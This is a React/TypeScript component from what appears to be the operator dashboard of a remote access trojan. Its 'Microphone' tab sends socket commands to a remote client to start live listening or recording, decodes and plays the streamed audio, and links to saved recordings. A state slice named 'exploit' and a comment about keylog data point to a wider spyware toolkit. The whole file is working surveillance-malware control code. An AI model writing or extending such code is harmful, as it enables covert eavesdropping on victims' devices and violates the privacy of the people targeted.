
import { useCallback, useEffect, useRef, useState } from 'react'
import { Button } from '@/components/ui/button'
import { Label } from '@/components/ui/label'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select'
import { Mic, Square, Play, Disc, Download } from 'lucide-react'
import { emitOrder, getSocket } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'
import { apiUrl } from '@/lib/config'

const RATES = [8000, 11025, 16000, 22050, 44100]

export function MicTab({ clientId }: { clientId: string }) {
  const savedFile = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.micSavedFile,
  )
  const [sampleRate, setSampleRate] = useState(11025)
  const [mode, setMode] = useState<'idle' | 'live' | 'record'>('idle')

  const audioCtxRef = useRef<AudioContext | null>(null)
  const nextStartRef = useRef(0)
  const barsRef = useRef<HTMLDivElement>(null)
  const modeRef = useRef(mode)
  const rateRef = useRef(sampleRate)

  useEffect(() => {
    modeRef.current = mode
  }, [mode])
  useEffect(() => {
    rateRef.current = sampleRate
  }, [sampleRate])

  const ensureCtx = useCallback(() => {
    if (!audioCtxRef.current) {
      const Ctx =
        (window as any).AudioContext || (window as any).webkitAudioContext
      const ctx: AudioContext = new Ctx()
      audioCtxRef.current = ctx
      nextStartRef.current = ctx.currentTime
    }
    // Browsers start AudioContext in "suspended" state until a user gesture;
    // resume() ensures live playback actually starts.
    const ctx = audioCtxRef.current
    if (ctx && ctx.state === 'suspended') {
      ctx.resume().catch(() => {})
    }
    return ctx
  }, [])

  const playChunk = useCallback(
    (base64: string) => {
      const ctx = ensureCtx()
      if (!ctx) return
      try {
        const binary = atob(base64)
        const len = binary.length
        const bytes = new Int16Array(len / 2)
        for (let i = 0; i < len; i += 2) {
          bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i)
        }
        const f32 = new Float32Array(bytes.length)
        for (let i = 0; i < bytes.length; i++) f32[i] = bytes[i] / 32768
        const buf = ctx.createBuffer(1, f32.length, rateRef.current)
        buf.copyToChannel(f32, 0)
        const src = ctx.createBufferSource()
        src.buffer = buf
        src.connect(ctx.destination)
        const now = ctx.currentTime
        if (nextStartRef.current < now) nextStartRef.current = now
        src.start(nextStartRef.current)
        nextStartRef.current += buf.duration
      } catch {
        // ignore decode errors
      }
    },
    [ensureCtx],
  )

  const animateBars = useCallback(() => {
    const bars = barsRef.current?.querySelectorAll('.vbar')
    bars?.forEach((b) => {
      ;(b as HTMLElement).style.height = `${Math.random() * 80 + 10}%`
    })
  }, [])

  useEffect(() => {
    const socket = getSocket()
    const onChunk = (msg: { id: string; data: { type?: string; data?: string } }) => {
      if (msg.id !== clientId || modeRef.current !== 'live') return
      // only play actual mic audio chunks (not keylog/notification data.data)
      if (msg.data?.type !== 'mic_chunk' || !msg.data?.data) return
      playChunk(msg.data.data)
      animateBars()
    }
    socket.on('client_data', onChunk)
    return () => {
      socket.off('client_data', onChunk)
    }
  }, [clientId, playChunk, animateBars])

  const stop = useCallback(() => {
    if (modeRef.current !== 'idle') {
      emitOrder(clientId, 'mic', { action: 'stop' })
    }
    setMode('idle')
    if (audioCtxRef.current) {
      audioCtxRef.current.close().catch(() => {})
      audioCtxRef.current = null
    }
  }, [clientId])

  useEffect(() => {
    return () => {
      stop()
    }
  }, [stop])

  const startLive = () => {
    if (mode === 'record') stop()
    setMode('live')
    // Create + resume the AudioContext on this user-gesture click so the
    // browser autoplay policy allows live playback of incoming chunks.
    ensureCtx()
    emitOrder(clientId, 'mic', {
      action: 'start',
      mode: 'live',
      sample_rate: sampleRate,
    })
  }
  const startRecord = () => {
    if (mode === 'live') stop()
    setMode('record')
    emitOrder(clientId, 'mic', {
      action: 'start',
      mode: 'record',
      sample_rate: sampleRate,
    })
  }

  return (
    <div className="space-y-4 max-w-2xl">
      <div className="flex items-center gap-2">
        <Mic className="h-4 w-4 text-emerald-400" />
        <h3 className="text-sm font-semibold text-zinc-100">Microphone</h3>
        <span className="ml-auto text-xs text-zinc-500">
          Status:{' '}
          <span
            className={
              mode === 'live'
                ? 'text-emerald-400'
                : mode === 'record'
                  ? 'text-amber-400'
                  : 'text-zinc-400'
            }
          >
            {mode === 'live'
              ? 'Live listening'
              : mode === 'record'
                ? 'Recording…'
                : 'Idle'}
          </span>
        </span>
      </div>

      <div className="space-y-2">
        <Label className="text-xs uppercase tracking-wider text-zinc-500">
          Sample Rate
        </Label>
        <Select
          value={String(sampleRate)}
          onValueChange={(v) => setSampleRate(parseInt(v, 10))}
          disabled={mode !== 'idle'}
        >
          <SelectTrigger className="bg-black/40 border-white/10 font-mono">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            {RATES.map((r) => (
              <SelectItem key={r} value={String(r)}>
                {r} Hz
              </SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>

      {/* Visualizer */}
      <div
        ref={barsRef}
        className="flex items-end gap-1 h-20 rounded-xl border border-white/10 bg-black/40 p-3"
      >
        {Array.from({ length: 24 }).map((_, i) => (
          <div
            key={i}
            className="vbar w-full rounded-t bg-gradient-to-t from-emerald-500/40 to-emerald-400"
            style={{ height: '10%' }}
          />
        ))}
      </div>

      <div className="flex flex-wrap gap-2">
        {mode === 'live' ? (
          <Button
            onClick={stop}
            className="bg-rose-500/90 hover:bg-rose-500 text-white font-semibold"
          >
            <Square className="h-4 w-4" /> Stop Live
          </Button>
        ) : (
          <Button
            onClick={startLive}
            className="bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-semibold"
          >
            <Play className="h-4 w-4" /> Live Listen
          </Button>
        )}
        {mode === 'record' ? (
          <Button
            onClick={stop}
            className="bg-rose-500/90 hover:bg-rose-500 text-white font-semibold"
          >
            <Square className="h-4 w-4" /> Stop Recording
          </Button>
        ) : (
          <Button
            onClick={startRecord}
            variant="outline"
            className="bg-transparent border-white/15 text-zinc-200 hover:bg-white/5"
          >
            <Disc className="h-4 w-4" /> Record
          </Button>
        )}
      </div>

      {savedFile && (
        <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 px-3 py-2 text-xs text-emerald-300 flex items-center gap-2">
          <Download className="h-3.5 w-3.5" />
          Recording saved:
          <a
            href={apiUrl(savedFile)}
            target="_blank"
            rel="noreferrer"
            className="font-mono underline hover:text-emerald-200"
          >
            {savedFile}
          </a>
        </div>
      )}
    </div>
  )
}
